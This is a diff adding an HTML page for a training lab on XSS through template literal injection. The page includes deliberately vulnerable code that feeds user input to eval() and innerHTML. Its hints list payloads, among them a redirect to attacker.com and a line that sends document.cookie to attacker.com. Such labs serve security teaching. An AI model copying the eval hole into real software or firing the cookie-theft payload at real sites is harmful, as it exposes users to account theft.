@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Template Literal Injection XSS Lab - Advanced XSS Practice Lab for Ethical Cybersecurity Training by Satyajit Sethy">
+    <meta name="author" content="Satyajit Sethy">
+    <title>Lab #11 - Template Literal Injection | XSS Practice Lab</title>
+    <link rel="stylesheet" href="../style.css">
+</head>
+<body>
+    <div class="lab-container">
+        <header class="lab-header">
+            <h1 class="glitch" data-text="LAB #11: TEMPLATE LITERAL XSS">LAB #11: TEMPLATE LITERAL INJECTION</h1>
+            <div class="warning-banner">
+                ⚠️ This platform is for ethical cybersecurity learning purposes only. ⚠️
+            </div>
+        </header>
+
+        <main>
+            <section class="lab-description">
+                <h2>Lab Objective</h2>
+                <p>Explore XSS vulnerabilities in JavaScript template literals and how they can lead to code execution.</p>
+                <div class="lab-objective">
+                    Goal: Execute arbitrary JavaScript using template literal injection.
+                </div>
+            </section>
+
+            <section class="vulnerable-section">
+                <div class="input-group">
+                    <label for="templateInput">Enter your name for greeting:</label>
+                    <input type="text" id="templateInput" placeholder="Your name">
+                    <button onclick="generateGreeting()">Generate Greeting</button>
+                    <button class="reset-button" data-lab="lab11">Reset</button>
+                </div>
+
+                <div class="output-area">
+                    <span class="output-label">Greeting</span>
+                    <div id="templateOutput"></div>
+                </div>
+            </section>
+
+            <section class="lab-description">
+                <h3>💡 Hints</h3>
+                <ul>
+                    <li>The app uses eval() or new Function() to process template literals</li>
+                    <li>Try: ${alert('XSS')}</li>
+                    <li>Try: ${7*7} to see if math works</li>
+                    <li>Try: ${document.location='http://attacker.com'}</li>
+                    <li>Try: ${new Image().src='http://attacker.com/steal?cookie='+document.cookie}</li>
+                </ul>
+                
+                <h3>📝 Notes</h3>
+                <ul>
+                    <li>Template literals with interpolation can execute arbitrary code when used with eval</li>
+                    <li>This simulates vulnerable templating engines</li>
+                </ul>
+            </section>
+        </main>
+
+        <footer>
+            <div class="footer-content">
+                <p>© 2026 - <span id="currentYear"></span> | Created by Satyajit Sethy</p>
+                <a href="https://github.com/sethysatyajit" target="_blank" rel="noopener noreferrer" class="github-link">GitHub</a>
+            </div>
+        </footer>
+    </div>
+
+    <script src="../script.js"></script>
+    <script>
+        function generateGreeting() {
+            const userName = document.getElementById('templateInput').value;
+            const output = document.getElementById('templateOutput');
+            
+            try {
+                // VULNERABLE CODE: Using eval with template literal
+                const greeting = eval('`Hello, ${"' + userName + '"}!`');
+                output.innerHTML = greeting;
+                
+                console.log('Generated greeting for:', userName);
+            } catch (e) {
+                output.innerHTML = '<p style="color: red;">Error: ' + e.message + '</p>';
+            }
+        }
+    </script>
+</body>
+</html>
